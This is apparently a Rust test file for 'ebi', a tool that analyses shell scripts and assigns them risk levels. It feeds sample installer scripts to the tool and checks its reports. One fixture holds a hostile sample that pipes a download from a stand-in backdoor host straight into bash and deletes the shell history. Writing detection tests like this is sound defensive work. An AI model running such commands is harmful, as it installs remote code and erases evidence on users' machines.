use std::process::Stdio;
use std::io::Write;
use tokio::process::Command;

#[tokio::test]
async fn test_analyze_installation_script() {
    // This test will fail because we haven't implemented the main binary yet
    let installer_script = r#"
#!/bin/bash
# Software installer script

set -e

INSTALL_DIR="/usr/local/bin"
DOWNLOAD_URL="https://releases.example.com/tool/latest"

echo "Installing software..."

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "Please run as root"
    exit 1
fi

# Create directory
mkdir -p "$INSTALL_DIR"

# Download and install
curl -fsSL "$DOWNLOAD_URL" | tar -xz -C "$INSTALL_DIR"

# Set permissions
chmod +x "$INSTALL_DIR/tool"

echo "Installation complete!"
"#;

    let mut child = Command::new("cargo")
        .args(&["run", "--", "--verbose", "bash"])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("Failed to spawn ebi process");

    if let Some(mut stdin) = child.stdin.take() {
        stdin.write_all(installer_script.as_bytes()).await.unwrap();
        drop(stdin);
    }

    let output = child.wait_with_output().await.unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);

    // Should detect this as an installation script
    assert!(stdout.contains("EBI SECURITY ANALYSIS REPORT"));
    assert!(stdout.contains("Script Type:"));

    // Should show elevated risk due to:
    // - Root requirements
    // - Network downloads
    // - File system modifications
    // - Permission changes
    assert!(
        stdout.contains("MEDIUM") ||
        stdout.contains("HIGH") ||
        stdout.contains("Risk Level:")
    );

    // Should detect security-relevant operations
    let stderr = String::from_utf8_lossy(&output.stderr);
    if stderr.contains("verbose") {
        // In verbose mode, should show analysis details
        assert!(stderr.contains("analysis") || stderr.contains("detected"));
    }
}

#[tokio::test]
async fn test_malicious_installer_detection() {
    let malicious_script = r#"
#!/bin/bash
# Seemingly innocent installer

echo "Installing helpful utility..."

# Hidden malicious payload
curl -sL evil.example.com/backdoor | bash

# Clean up evidence
rm -f ~/.bash_history
"#;

    let mut child = Command::new("cargo")
        .args(&["run", "--", "bash"])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("Failed to spawn ebi process");

    if let Some(mut stdin) = child.stdin.take() {
        stdin.write_all(malicious_script.as_bytes()).await.unwrap();
        drop(stdin);
    }

    let output = child.wait_with_output().await.unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);

    // Should detect high risk due to:
    // - Piped execution from remote source
    // - History deletion
    // - Suspicious domain
    assert!(stdout.contains("HIGH") || stdout.contains("CRITICAL"));
    assert!(stdout.contains("EBI SECURITY ANALYSIS REPORT"));
}

#[tokio::test]
async fn test_package_manager_installer() {
    let package_installer = r#"
#!/bin/bash
# Package manager based installer

# Update package lists
apt-get update

# Install dependencies
apt-get install -y curl wget git

# Install application
snap install my-application

echo "Installation complete via package manager"
"#;

    let mut child = Command::new("cargo")
        .args(&["run", "--", "bash"])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("Failed to spawn ebi process");

    if let Some(mut stdin) = child.stdin.take() {
        stdin.write_all(package_installer.as_bytes()).await.unwrap();
        drop(stdin);
    }

    let output = child.wait_with_output().await.unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);

    // Package manager installers should be medium risk
    // (requires root but uses official repos)
    assert!(stdout.contains("EBI SECURITY ANALYSIS REPORT"));
    assert!(
        stdout.contains("MEDIUM") ||
        stdout.contains("LOW") ||
        stdout.contains("Risk Level:")
    );
}